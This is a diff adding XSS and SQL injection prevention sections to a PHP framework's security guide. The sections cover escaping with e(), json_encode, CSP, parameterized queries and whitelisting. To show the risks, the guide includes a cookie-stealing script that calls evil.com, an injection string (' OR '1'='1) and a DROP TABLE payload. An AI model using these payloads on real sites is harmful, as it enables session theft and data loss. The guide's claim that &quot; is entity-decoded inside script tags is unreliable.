@@ -12,8 +12,10 @@ A hands-on guide to configuring and using the three core security middleware in 
 2. [CSRF Protection](#csrf-protection)
 3. [Rate Limiting](#rate-limiting)
 4. [CORS](#cors)
-5. [Combining Security Middleware](#combining-security-middleware)
-6. [Complete Example](#complete-example)
+5. [XSS Prevention](#xss-prevention)
+6. [SQL Injection Prevention](#sql-injection-prevention)
+7. [Combining Security Middleware](#combining-security-middleware)
+8. [Complete Example](#complete-example)
 
 ---
 
@@ -390,6 +392,471 @@ Browser                        Server
 ```
 
 The middleware checks the `Origin` header against `allowed_origins`. It supports exact matches, wildcard (`*` for any origin), and wildcard subdomains (`*.example.com`). If the origin is permitted, it is reflected back in `Access-Control-Allow-Origin`. If not, the header is omitted and the browser blocks the response.
+
+---
+
+## XSS Prevention
+
+### What is XSS?
+
+Cross-Site Scripting (XSS) occurs when an attacker injects malicious JavaScript into your application's output, which then executes in other users' browsers. This can steal session cookies, redirect users to phishing sites, or modify page content.
+
+**Example Attack:**
+
+A user submits a comment containing:
+
+```html
+<script>
+    // Steal session cookie and send to attacker
+    fetch('https://evil.com/steal?cookie=' + document.cookie);
+</script>
+```
+
+If you render this comment without escaping, the script executes in every visitor's browser.
+
+### How the Framework Prevents XSS
+
+The SO Framework provides the `e()` helper function (short for "escape") that converts special HTML characters into their entity equivalents, preventing browsers from interpreting them as code.
+
+| Character | Converted To | Why |
+|-----------|--------------|-----|
+| `<` | `&lt;` | Prevents opening tags |
+| `>` | `&gt;` | Prevents closing tags |
+| `&` | `&amp;` | Prevents entity injection |
+| `"` | `&quot;` | Prevents breaking attributes |
+| `'` | `&#039;` | Prevents breaking attributes |
+
+### Using e() to Escape Output
+
+**Always** escape user-generated content when rendering it in views:
+
+```php
+<!-- Vulnerable (NEVER do this) -->
+<h1>Welcome, <?= $userName ?></h1>
+
+<!-- Safe (ALWAYS do this) -->
+<h1>Welcome, <?= e($userName) ?></h1>
+```
+
+**Example with Malicious Input:**
+
+```php
+$userName = '<script>alert("XSS")</script>';
+```
+
+**Without escaping:**
+```html
+<h1>Welcome, <script>alert("XSS")</script></h1>
+```
+Result: The alert executes.
+
+**With escaping:**
+```html
+<h1>Welcome, &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</h1>
+```
+Result: The browser displays the literal text `<script>alert("XSS")</script>` -- the script does not execute.
+
+### When to Use e()
+
+Escape **every** variable that contains user-generated or database-stored content:
+
+```php
+<!-- User names and emails -->
+<p>Email: <?= e($user->email) ?></p>
+
+<!-- Form input values -->
+<input type="text" name="name" value="<?= e(old('name')) ?>">
+
+<!-- Database content -->
+<p><?= e($comment->body) ?></p>
+
+<!-- Query string parameters -->
+<p>Search: <?= e($request->input('q')) ?></p>
+
+<!-- URL parameters -->
+<a href="/users/<?= e($userId) ?>"><?= e($userName) ?></a>
+```
+
+### When NOT to Use e()
+
+Do **not** escape HTML that you intentionally want to render (trusted content only):
+
+```php
+<!-- Markdown or rich text from a trusted admin -->
+<?php
+$adminContent = parseMarkdown($post->body); // Returns safe HTML
+echo $adminContent; // Safe because admin is trusted and content is sanitized
+?>
+```
+
+**Warning:** Only skip escaping for content from **trusted sources** that has been **sanitized** by a library like HTMLPurifier or Markdown parser.
+
+### Escaping in Different Contexts
+
+**HTML Attributes:**
+
+```php
+<div class="user-<?= e($userRole) ?>">
+<img src="<?= e($imageUrl) ?>" alt="<?= e($imageAlt) ?>">
+```
+
+**JavaScript Strings:**
+
+For embedding PHP variables in JavaScript, use `json_encode()` instead of `e()`:
+
+```php
+<script>
+    const userName = <?= json_encode($user->name) ?>;
+    const userData = <?= json_encode($user->toArray()) ?>;
+</script>
+```
+
+**Never** do this:
+
+```php
+<!-- VULNERABLE -->
+<script>
+    const userName = "<?= e($user->name) ?>";
+</script>
+```
+
+If `$user->name` is `"; alert('XSS'); "`, the result is:
+
+```javascript
+const userName = "&quot;; alert('XSS'); &quot;";
+```
+
+This still executes because `&quot;` is decoded by the browser before JavaScript parses it.
+
+**URL Parameters:**
+
+Use `urlencode()` for query strings:
+
+```php
+<a href="/search?q=<?= urlencode($searchTerm) ?>">Search</a>
+```
+
+**CSS:**
+
+Avoid embedding user content in CSS. If you must:
+
+```php
+<style>
+    .user-color {
+        color: <?= preg_match('/^#[0-9A-Fa-f]{6}$/', $color) ? $color : '#000000' ?>;
+    }
+</style>
+```
+
+Validate the input format before outputting.
+
+### Content Security Policy (CSP)
+
+For extra protection, add a Content Security Policy header to block inline scripts:
+
+```php
+// In a middleware or controller
+public function handle(Request $request, Closure $next): Response
+{
+    $response = $next($request);
+
+    $response->header('Content-Security-Policy',
+        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
+    );
+
+    return $response;
+}
+```
+
+This prevents any `<script>` tags not loaded from your domain from executing, even if an XSS payload makes it through.
+
+### Quick Reference: XSS Prevention Checklist
+
+- **Always** use `e()` for user-generated content in HTML
+- **Always** use `json_encode()` for PHP-to-JavaScript data
+- **Always** use `urlencode()` for query string parameters
+- **Always** validate and sanitize rich text/HTML from editors
+- **Never** output raw user input directly into HTML
+- **Never** trust data from forms, URLs, or databases without escaping
+
+---
+
+## SQL Injection Prevention
+
+### What is SQL Injection?
+
+SQL injection occurs when an attacker manipulates SQL queries by injecting malicious input through form fields, URL parameters, or other user inputs.
+
+**Example Attack:**
+
+```php
+// VULNERABLE CODE (NEVER do this)
+$email = $_POST['email'];
+$sql = "SELECT * FROM users WHERE email = '{$email}'";
+$result = $db->query($sql);
+```
+
+If an attacker submits:
+
+```
+email = admin@example.com' OR '1'='1
+```
+
+The query becomes:
+
+```sql
+SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'
+```
+
+This returns **all users** instead of one, because `'1'='1'` is always true.
+
+### How the Framework Prevents SQL Injection
+
+The SO Framework uses **parameterized queries** (prepared statements) throughout its database layer, which separates SQL code from user data.
+
+### Always Use Query Builder or Models
+
+The framework's Query Builder and Model classes automatically use parameterized queries:
+
+**Safe (Query Builder):**
+
+```php
+use Core\Database\DB;
+
+// WHERE clause with bindings
+$users = DB::table('users')
+    ->where('email', $request->input('email'))
+    ->get();
+
+// Multiple conditions
+$posts = DB::table('posts')
+    ->where('user_id', $userId)
+    ->where('status', $status)
+    ->get();
+```
+
+**Safe (Model):**
+
+```php
+use App\Models\User;
+
+// Find by primary key
+$user = User::find($request->input('id'));
+
+// Find by attribute
+$user = User::findBy('email', $request->input('email'));
+
+// Where queries
+$users = User::where('role', $request->input('role'))->get();
+```
+
+**Safe (Raw Query with Bindings):**
+
+If you need raw SQL, always use parameter binding:
+
+```php
+$email = $request->input('email');
+
+// Positional placeholders
+$result = app('db')->connection->query(
+    "SELECT * FROM users WHERE email = ? AND status = ?",
+    [$email, 'active']
+);
+
+// Named placeholders
+$result = app('db')->connection->query(
+    "SELECT * FROM users WHERE email = :email AND status = :status",
+    ['email' => $email, 'status' => 'active']
+);
+```
+
+### Never Concatenate User Input into SQL
+
+**NEVER do this:**
+
+```php
+// VULNERABLE - String concatenation
+$sql = "SELECT * FROM users WHERE email = '{$request->input('email')}'";
+$result = app('db')->connection->query($sql);
+
+// VULNERABLE - String interpolation
+$email = $request->input('email');
+$sql = "SELECT * FROM users WHERE email = '{$email}'";
+$result = app('db')->connection->query($sql);
+
+// VULNERABLE - Building WHERE clauses manually
+$filters = "status = '{$request->input('status')}'";
+$sql = "SELECT * FROM users WHERE {$filters}";
+```
+
+### Validating Input Before Queries
+
+Even with parameterized queries, always validate input to ensure it matches expected formats:
+
+```php
+use Core\Validation\Validator;
+
+// Validate before querying
+$validator = Validator::make($request->all(), [
+    'id'     => 'required|integer',
+    'email'  => 'required|email',
+    'role'   => 'required|in:admin,user,moderator',
+]);
+
+if ($validator->fails()) {
+    return redirect()->back()->withErrors($validator->errors());
+}
+
+// Now safe to use in queries
+$user = User::find($request->input('id'));
+```
+
+### Safe Dynamic Column Names and Table Names
+
+**Problem:** Query Builder only protects **values**, not column/table names.
+
+**Vulnerable:**
+
+```php
+// User controls the column name - DANGEROUS
+$column = $request->input('sort_by'); // Could be: "id; DROP TABLE users--"
+$users = DB::table('users')->orderBy($column)->get();
+```
+
+**Solution:** Whitelist allowed columns:
+
+```php
+$sortBy = $request->input('sort_by', 'created_at');
+
+$allowedColumns = ['name', 'email', 'created_at', 'status'];
+
+if (!in_array($sortBy, $allowedColumns)) {
+    $sortBy = 'created_at'; // Default
+}
+
+$users = DB::table('users')->orderBy($sortBy)->get();
+```
+
+### Safe LIKE Queries
+
+When using `LIKE` with user input, escape wildcard characters:
+
+```php
+$search = $request->input('search');
+
+// Escape special LIKE characters (%, _)
+$escapedSearch = str_replace(['%', '_'], ['\%', '\_'], $search);
+
+$users = DB::table('users')
+    ->where('name', 'LIKE', "%{$escapedSearch}%")
+    ->get();
+```
+
+The Query Builder still uses parameter binding for the value, but we manually escape wildcards to prevent unintended matching.
+
+### Safe Dynamic Table Names (Advanced)
+
+If you absolutely must use dynamic table names (rare), validate them:
+
+```php
+$tableName = $request->input('table');
+
+// Whitelist approach
+$allowedTables = ['users', 'posts', 'comments'];
+
+if (!in_array($tableName, $allowedTables)) {
+    throw new \InvalidArgumentException('Invalid table name');
+}
+
+$results = DB::table($tableName)->get();
+```
+
+Or use Schema validation:
+
+```php
+use Core\Database\Schema;
+
+$tableName = $request->input('table');
+
+if (!Schema::hasTable($tableName)) {
+    throw new \InvalidArgumentException('Table does not exist');
+}
+
+$results = DB::table($tableName)->get();
+```
+
+### Quick Reference: SQL Injection Prevention Checklist
+
+- **Always** use Query Builder or Models for database operations
+- **Always** use parameterized queries for raw SQL (`?` or `:name` placeholders)
+- **Always** validate user input before queries
+- **Always** whitelist column names and table names if user-controlled
+- **Always** escape wildcards in LIKE queries
+- **Never** concatenate user input into SQL strings
+- **Never** trust user input for column/table names without validation
+- **Never** use `eval()` or dynamic SQL construction with user data
+
+### Example: Safe Search Feature
+
+**Complete safe search implementation:**
+
+```php
+use Core\Database\DB;
+use Core\Validation\Validator;
+
+public function search(Request $request): Response
+{
+    // 1. Validate input
+    $validator = Validator::make($request->all(), [
+        'query'   => 'required|string|max:100',
+        'sort_by' => 'string|in:name,created_at,email',
+        'status'  => 'string|in:active,inactive,banned',
+    ]);
+
+    if ($validator->fails()) {
+        return redirect()->back()->withErrors($validator->errors());
+    }
+
+    // 2. Sanitize search term
+    $query = $request->input('query');
+    $escapedQuery = str_replace(['%', '_'], ['\%', '\_'], $query);
+
+    // 3. Whitelist sort column
+    $sortBy = $request->input('sort_by', 'created_at');
+    $allowedSorts = ['name', 'created_at', 'email'];
+    if (!in_array($sortBy, $allowedSorts)) {
+        $sortBy = 'created_at';
+    }
+
+    // 4. Execute safe parameterized query
+    $users = DB::table('users')
+        ->where('name', 'LIKE', "%{$escapedQuery}%")
+        ->where('status', $request->input('status', 'active'))
+        ->orderBy($sortBy)
+        ->limit(50)
+        ->get();
+
+    return Response::view('users/search', [
+        'users' => $users,
+        'query' => $query, // Original query for display (will be escaped by e() in view)
+    ]);
+}
+```
+
+**View template (safe output):**
+
+```php
+<h2>Search Results for "<?= e($query) ?>"</h2>
+
+<ul>
+    <?php foreach ($users as $user): ?>
+        <li>
+            <strong><?= e($user['name']) ?></strong>
+            (<?= e($user['email']) ?>)
+        </li>
+    <?php endforeach; ?>
+</ul>
+```
 
 ---
 
